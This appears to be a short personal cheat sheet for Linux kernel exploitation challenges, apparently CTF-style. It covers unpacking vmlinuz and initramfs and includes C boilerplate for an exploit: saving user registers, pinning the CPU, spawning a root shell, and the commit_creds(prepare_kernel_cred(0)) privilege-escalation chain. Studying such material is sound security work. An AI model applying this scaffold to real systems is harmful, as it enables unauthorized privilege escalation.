* vmlinuz

Contains the compressed kernel, can decompress with `extract-image.sh`

`extract-image.sh ./vmlinuz | save ./vmlinux`

Find symbols: [https://github.com/marin-m/vmlinux-to-elf]

* initramfs.cpio.gz

Filesystem, `gunzip` first then unserialize with `cpio`

Can repack with `compress.sh exploit.c`

@code bash
gunzip initramfs.cpio.gz
cat initramfs.cpio | cpio -idm
@end

https://bsauce.github.io/2021/09/26/kernel-exploit-%E6%9C%89%E7%94%A8%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93/

* Script

Useful pre-exploit initialization

@code c
#include <sched.h>
#include <unistd.h>

void single_thread() {
  // set cpu to 1 thread
  cpu_set_t cpu;
  CPU_ZERO(&cpu);
  CPU_SET(0, &cpu);
  sched_setaffinity(getpid(), sizeof(cpu), &cpu);
}

size_t user_cs, user_ss, user_sp, user_rflags;
void save_state() {
  __asm__(
      ".intel_syntax noprefix;"
      "mov user_cs, cs;"
      "mov user_ss, ss;"
      "mov user_sp, rsp;"
      "pushf;"
      "pop user_rflags;"
      ".att_syntax;"
  );
}

void get_shell() {
  if (getuid() == 0) {
    system("/bin/sh");
  } else {
    puts("[-] failed to get root");
  }
}

@end

Common ROP chain:

@code c
commit_creds(prepare_kernel_cred(0))
commit_creds(prepare_kernel_cred(&init_task))
@end
